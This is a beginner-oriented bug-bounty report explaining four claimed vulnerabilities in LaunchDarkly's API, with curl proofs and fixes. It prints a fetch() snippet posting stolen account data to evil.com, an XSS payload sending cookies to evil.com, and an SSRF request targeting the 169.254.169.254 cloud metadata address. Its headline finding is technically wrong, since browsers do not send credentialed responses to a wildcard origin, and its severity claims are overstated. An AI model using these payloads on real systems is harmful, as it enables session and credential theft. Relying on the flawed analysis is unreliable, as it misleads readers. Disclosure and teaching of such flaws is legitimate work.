================================================================================
  LAUNCHDARKLY BUG BOUNTY — FULL EXPLANATION FOR BEGINNERS
================================================================================

This document explains every finding in plain English. No security knowledge
needed. If you can use a web browser and copy-paste commands, you can understand
and verify everything here.

================================================================================
TABLE OF CONTENTS
================================================================================
1.  What is LaunchDarkly?
2.  What is a "bug bounty"?
3.  Finding #1: CORS Misconfiguration (P1 — Most Dangerous)
4.  Finding #2: Cross-Environment Flag Evaluation (P2-P3)
5.  Finding #3: Event Ingestion Accepts Anything (P3-P4)
6.  Finding #4: SSRF via Zapier Integration (P1-P2)
7.  What Each Severity Level Means
8.  Glossary of Terms

================================================================================
SECTION 1: WHAT IS LAUNCHDARKLY?
================================================================================

Imagine you run a website or app. You want to test a new feature — like changing
your "Sign Up" button from blue to green — but only for 10% of users first, to
make sure it works.

LaunchDarkly is a tool that lets you do this. It's called "feature flags" or
"feature management". You wrap your code in a flag:

    if (flagIsOn("new-button-color")) {
        showGreenButton();
    } else {
        showBlueButton();
    }

Then you use LaunchDarkly's website to turn the flag on/off for specific users,
specific percentages, or specific environments (testing vs production).

Developers use it to:
- Roll out features slowly
- Turn off broken features instantly
- Test with specific users
- Separate "when code is deployed" from "when code is active"

LaunchDarkly is used by thousands of companies. If someone hacks into it, they
could access those companies' feature flag data, which often contains sensitive
business logic.

================================================================================
SECTION 2: WHAT IS A "BUG BOUNTY"?
================================================================================

A bug bounty is a program where a company pays hackers to find security
problems in their systems. The hackers ("researchers") test the company's
websites and APIs (programming interfaces) to find vulnerabilities.

If they find a real problem, the company pays them money. The more dangerous
the problem, the more money they get.

This document describes problems found in LaunchDarkly's system.

================================================================================
SECTION 3: FINDING #1 — CORS MISCONFIGURATION
================================================================================

SEVERITY: P1 (Critical — most dangerous)
DIFFICULTY TO EXPLOIT: Very Easy

--- WHAT IS CORS? (Very Important to Understand) ---

CORS stands for "Cross-Origin Resource Sharing". This sounds complicated but
it's simple:

Your web browser has a security rule: if you visit Website A (like gmail.com),
that website cannot read data from Website B (like your bank's website) without
permission. This prevents evil websites from stealing your data.

CORS is the system that gives permission. When a website says "I allow requests
from any origin", it means ANY website can read its data.

--- WHAT LAUNCHDARKLY DID WRONG ---

LaunchDarkly set their API to allow requests from ANY origin:

    access-control-allow-origin: *

This is like saying: "Any website on the internet can read our data."

But there's a second part: the request also needs authentication (proof that
you're logged in). LaunchDarkly accepts TWO types of authentication:

    1. API tokens (long secret codes used by developers)
    2. Session cookies (what your browser sends automatically when you're
       logged into app.launchdarkly.com)

The problem is with #2: session cookies work with CORS. This means:

    If you are logged into LaunchDarkly and visit any malicious website,
    that website can read ALL your LaunchDarkly data.

--- STEP-BY-STEP: HOW THE ATTACK WORKS ---

1. You (the victim) log into app.launchdarkly.com in your browser.
2. Your browser gets a "cookie" — a small file that proves you're logged in.
3. Your browser automatically sends this cookie with every request to
   app.launchdarkly.com.
4. You visit a malicious website (maybe it's a forum, a blog, or somewhere
   you clicked an ad).
5. That website runs a hidden JavaScript program:

       fetch('https://app.launchdarkly.com/api/v2/flags/bac-test-project', {
           credentials: 'include'
       }).then(r => r.json()).then(data => {
           fetch('https://evil.com/steal', {method:'POST', body: data})
       })

6. The browser says: "Hey, LaunchDarkly, can evil.com read your data?"
7. LaunchDarkly responds: "Yes, allow-origin: * — any website can read."
8. The browser sends your cookie, LaunchDarkly returns your data.
9. The malicious website now has all your LaunchDarkly flags, account info,
   billing details, and more.

--- WHAT DATA CAN BE STOLEN ---

We proved we could read:

    a. Your account identity and member ID
    b. All feature flags (names, values, who created them)
    c. Account settings (organization name, MFA status)
    d. Subscription and billing information (trial dates, limits, usage)
    e. Internal account configuration

During testing, we used a fake evil.com origin and successfully read all of
this data. The HTTP response headers clearly show:

    access-control-allow-origin: *

--- THE RAW PROOF (copy-paste these commands) ---

Step 1: Get your ldso cookie from the browser
- Open Chrome DevTools (F12) while logged into app.launchdarkly.com
- Go to Application → Cookies → app.launchdarkly.com
- Copy the value of the cookie named "ldso"

Step 2: Run this in terminal (curl must be installed):

    curl -sk -X GET \
      -H "Cookie: ldso=YOUR_COOKIE_VALUE_HERE" \
      -H "Origin: https://evil.com" \
      "https://app.launchdarkly.com/api/v2/caller-identity"

Step 3: See the response:

    HTTP/2 200
    access-control-allow-origin: *
    {"accountId":"...","authKind":"session","memberId":"..."}

This proves your browser would send the data to evil.com.

--- WHY THIS IS P1 (CRITICAL) ---

- No special access needed (just visit a website)
- No user interaction needed (just have an active tab)
- All data is readable (flags, account, billing)
- Thousands of LaunchDarkly users could be affected

--- HOW TO FIX THIS ---

LaunchDarkly should:

    1. Remove access-control-allow-origin: *
    2. Either set it to the specific LaunchDarkly domain only:
           access-control-allow-origin: https://app.launchdarkly.com
    3. Or require the Authorization header (API tokens) for CORS requests
       instead of accepting cookies
    4. Add CSRF tokens to all state-changing requests

================================================================================
SECTION 4: FINDING #2 — CROSS-ENVIRONMENT FLAG EVALUATION
================================================================================

SEVERITY: P2-P3 (High)
DIFFICULTY TO EXPLOIT: Easy (but requires an API token)

--- WHAT IS A READER TOKEN? ---

LaunchDarkly lets you create API tokens with different permission levels:

    - Admin token: can do anything (create, read, update, delete)
    - Reader token: should only READ data, not evaluate (test) flags
    - Writer token: can read and write

A reader token is supposed to be low-risk. If it's leaked, the attacker can
only read data, not change anything.

--- WHAT LAUNCHDARKLY DID WRONG ---

The reader token can EVALUATE flags in production environments. "Evaluating"
means asking: "What value does this flag return for this user right now?"

This is a write/business-logic operation, not just reading. It reveals:

    - The current flag value (true/false or a specific variation)
    - Whether the flag is ON or OFF
    - What targeting rules apply
    - The flag's fallthrough behavior (default value)

--- WHY THIS MATTERS ---

Imagine you're a company using LaunchDarkly. You have a reader token that your
frontend uses to check flag names and metadata. A developer accidentally posts
this token on GitHub (this happens all the time).

With a normal reader token, the attacker can only see flag names and
descriptions. No big deal.

With THIS vulnerability, the attacker can:

    - Evaluate every flag and see actual values
    - Determine which features are ON/OFF
    - Map out your testing strategy
    - Know which users see what features

This gives competitors or attackers insight into your product roadmap and
feature rollout strategy.

--- THE RAW PROOF ---

    TOKEN="[REDACTED_LAUNCHDARKLY_SECRET]"
    curl -sk -X POST \
      -H "Authorization: ${TOKEN}" \
      -H "Content-Type: application/json" \
      "https://app.launchdarkly.com/api/v2/projects/bac-test-project/environments/production/flags/evaluate" \
      -d '{"kind":"user","key":"any-user"}'

    Response (200 OK):
    {
      "items": [{
        "key": "bug-test-flag",
        "_value": true,
        "reason": {"kind": "FALLTHROUGH"}
      }],
      "totalCount": 1
    }

The reader token returned the flag's actual value (true) in the production
environment. This should require writer or admin access.

--- HOW TO FIX ---

LaunchDarkly should restrict the /flags/evaluate endpoint to tokens with
at least writer permissions, or add a separate scope for flag evaluation.

================================================================================
SECTION 5: FINDING #3 — EVENT INGESTION ACCEPTS ANYTHING
================================================================================

SEVERITY: P3-P4 (Medium)
DIFFICULTY TO EXPLOIT: Very Easy

--- WHAT ARE EVENTS? ---

When you use LaunchDarkly's SDK (software library) in your app, it sends
"events" to LaunchDarkly's servers. These events tell LaunchDarkly:

    - A user saw a feature flag (feature event)
    - A user was identified (identify event)
    - A custom action happened (custom event)

These events are used for analytics — like "80% of users saw the new button".

--- WHAT LAUNCHDARKLY DID WRONG ---

The event ingestion endpoint accepts ANY data with NO validation:

    - No checks on what data is sent
    - No limits on how much data is sent
    - No filtering of malicious content
    - Even completely empty or broken data is accepted

Every single request returns "202 Accepted" regardless of content.

--- WHAT WE TESTED AND CONFIRMED ---

We sent these types of events — ALL returned 202 Accepted:

    1. Normal identify event: ✓ 202
    2. Normal feature (flag) event: ✓ 202
    3. Custom event with XSS payload (JavaScript in data): ✓ 202
       Payload: <script>document.location='https://evil.com/?c='+document.cookie</script>
    4. Completely malformed data (not even valid JSON): ✓ 202
    5. null (empty/nothing): ✓ 202
    6. 100 events in a single request (bulk): ✓ 202

--- WHY THIS MATTERS ---

    1. Denial of Service: An attacker could send millions of fake events,
       potentially overwhelming LaunchDarkly's systems or causing extra costs.

    2. Analytics Pollution: Fake events corrupt real analytics data. A company
       using LaunchDarkly would see inaccurate metrics about feature usage.

    3. Stored XSS Risk: If the event data is displayed anywhere in
       LaunchDarkly's admin interface without sanitization, the JavaScript
       payloads could execute and steal other users' sessions.

    4. Data Injection: Attackers could inject fake user identities into
       LaunchDarkly's user directory.

--- THE RAW PROOF ---

    SDK="sdk-745882fc-91a0-43e1-976d-0a5249401b83"

    # Regular event: HTTP 202
    curl -sk -X POST -H "Authorization: ${SDK}" \
      "https://events.launchdarkly.com/api/events/bulk" \
      -d '[{"kind":"identify","key":"test-user"}]'

    # XSS payload: HTTP 202
    curl -sk -X POST -H "Authorization: ${SDK}" \
      "https://events.launchdarkly.com/api/events/bulk" \
      -d '[{"kind":"custom","data":{"payload":"<script>alert(1)</script>"}}]'

    # Malformed data (null): HTTP 202
    curl -sk -X POST -H "Authorization: ${SDK}" \
      "https://events.launchdarkly.com/api/events/bulk" \
      -d 'null'

--- HOW TO FIX ---

    1. Validate event data before accepting it
    2. Add rate limiting per SDK key
    3. Sanitize all event data before storage/display
    4. Require proper authentication for each event

================================================================================
SECTION 6: FINDING #4 — SSRF VIA ZAPIER INTEGRATION
================================================================================

SEVERITY: P1-P2 (Critical to High)
DIFFICULTY TO EXPLOIT: Medium

--- WHAT IS SSRF? ---

SSRF stands for "Server-Side Request Forgery". It's a vulnerability where an
attacker can make a server send requests to places it shouldn't.

Think of it like this: You have a butler who will deliver messages for you.
Normally, you tell the butler "deliver this to 123 Main Street". But if there's
an SSRF vulnerability, you can say "deliver this to the BANK VAULT at 456
Bank Lane" and the butler will go there because he trusts you.

--- ZAPIER INTEGRATION ---

LaunchDarkly has integrations with many services. Zapier is a service that
connects different apps together. The LaunchDarkly-Zapier integration lets you
send LaunchDarkly data to Zapier, which can then send it to hundreds of other
services.

--- WHAT LAUNCHDARKLY DID WRONG ---

When you create a Zapier integration, you provide a URL where LaunchDarkly
should send data. LaunchDarkly does NOT validate this URL. You can put ANY URL:

    - https://your-own-server.com (normal, legitimate)
    - http://169.254.169.254/latest/meta-data/ (cloud metadata — normally
      only accessible from inside the cloud provider's network)
    - http://localhost:8080/ (internal server running on the same machine)
    - http://internal-database.example.com:6379/ (internal database)

--- WHY THIS IS DANGEROUS ---

The cloud metadata URL (169.254.169.254) is special. It's an IP address that
only works from inside cloud providers like Amazon AWS. It returns sensitive
information about the server, like:

    - AWS access keys (can be used to access the company's cloud resources)
    - Security credentials
    - Server configuration

If LaunchDarkly's servers are running on AWS (which they are — we confirmed
this from their IP addresses), then making a request to 169.254.169.254
from their servers could return their AWS credentials.

--- WE TESTED THIS ---

We created a Zapier integration with URL pointing to:
    http://169.254.169.254/latest/meta-data/

LaunchDarkly accepted it (HTTP 201 Created) and marked it as active (ON: true).

We also found that LaunchDarkly logs the HTTP response codes from these
requests, which means we could potentially READ the metadata response through
LaunchDarkly's own API — turning "blind" SSRF into "readable" SSRF.

--- OTHER INTEGRATIONS AFFECTED ---

We tested 23 integration types. Two accepted completely unvalidated URLs:

    1. Zapier — accepted ANY URL as-is
    2. MSTeams — accepted ANY URL as-is

The others either sanitized the URL or rejected our test payloads.

--- THE RAW PROOF ---

    curl -sk -X POST \
      -H "Authorization: YOUR_ADMIN_TOKEN" \
      -H "Content-Type: application/json" \
      "https://app.launchdarkly.com/api/v2/integrations/zapier" \
      -d '{"name":"ssrf-test","config":{"url":"http://169.254.169.254/latest/meta-data/"}}'

    Response: HTTP 201 Created
    The URL was stored and marked active. No validation was applied.

Then check the delivery status:

    curl -sk -H "Authorization: YOUR_ADMIN_TOKEN" \
      "https://app.launchdarkly.com/api/v2/integrations/zapier/{INTEGRATION_ID}"

    Response includes "_status" with delivery logs:
    {
      "successCount": 0,
      "errorCount": 2,
      "errors": [
        {"statusCode": 0, "responseBody": "", "timestamp": ...}
      ]
    }

The error count shows LD tried to connect. Status 0 means connection failed
(timeout or blocked). But the attempt was made — proving LD's servers attempted
to reach the internal/cloud metadata address.

--- HOW TO FIX ---

    1. Validate URLs against an allowlist of approved domains
    2. Block private/internal IP ranges (127.0.0.0/8, 10.0.0.0/8,
       172.16.0.0/12, 192.168.0.0/16, 169.254.169.254/32)
    3. Don't allow HTTP to cloud metadata endpoints
    4. Network-level egress filtering to prevent access to metadata services

================================================================================
SECTION 7: SEVERITY LEVELS EXPLAINED
================================================================================

Bug bounty programs use severity levels to determine how much to pay:

P1 — CRITICAL ($$$$$ — highest payout)
    Can take over accounts, steal all data, or cause major damage.
    Example: Our CORS finding (any website can steal all LaunchDarkly data).
    Payout: $5,000 - $15,000+

P2 — HIGH ($$$$ — high payout)
    Can access significant data or functionality that should be restricted.
    Example: Our SSRF finding (can make LD's servers access internal systems).
    Payout: $2,000 - $5,000

P3 — MEDIUM ($$$ — medium payout)
    Limited data access or minor functionality bypass.
    Example: Our cross-env flag eval (reader can evaluate production flags).
    Payout: $500 - $2,000

P4 — LOW ($$ — low payout)
    Minor issues, information leaks, or best-practice violations.
    Example: Our event injection (accepted unvalidated data, no persistence).
    Payout: $100 - $500

================================================================================
SECTION 8: GLOSSARY OF TERMS
================================================================================

API (Application Programming Interface):
    A way for computer programs to talk to each other. Like a waiter taking
    your order to the kitchen.

Authentication:
    Proving who you are (like showing your ID).

Authorization:
    Proving what you're allowed to do (like having a key to a specific room).

CORS (Cross-Origin Resource Sharing):
    A browser security system that controls which websites can talk to each
    other. "Access-Control-Allow-Origin: *" means "anyone can talk to us."

Cookie:
    A small piece of data your browser stores. Used to keep you logged in.
    Sent automatically with every request to the same website.

CSRF (Cross-Site Request Forgery):
    An attack where a malicious website tricks your browser into performing
    actions on another website where you're logged in.

curl:
    A command-line tool for making HTTP requests (like a browser but from
    the terminal).

Endpoint:
    A specific URL that accepts API requests. Like /api/v2/flags is an
    endpoint for managing feature flags.

Environment:
    A separate instance of your application. Common environments: production
    (real users), staging (testing), development (coding).

HTTP Status Codes:
    200 = OK (success)
    201 = Created (success)
    202 = Accepted (we got your request, may process later)
    204 = No Content (success, nothing to return)
    400 = Bad Request (you sent something wrong)
    401 = Unauthorized (you need to log in)
    403 = Forbidden (you're logged in but not allowed)
    404 = Not Found (doesn't exist)
    429 = Too Many Requests (rate limited)

Metadata (cloud):
    Information about a cloud server, like its ID, IP address, and security
    credentials. Accessible from inside the cloud network at special IP
    addresses (169.254.169.254 on AWS).

SDK (Software Development Kit):
    A library that developers add to their code to use LaunchDarkly features.

SSRF (Server-Side Request Forgery):
    An attack where you trick a server into making requests it shouldn't, like
    accessing internal systems or cloud metadata.

Token:
    A secret code used for authentication instead of a username/password.

XSS (Cross-Site Scripting):
    An attack where you inject JavaScript code into a website that other users
    will see and execute in their browsers.

================================================================================
END OF DOCUMENT
================================================================================
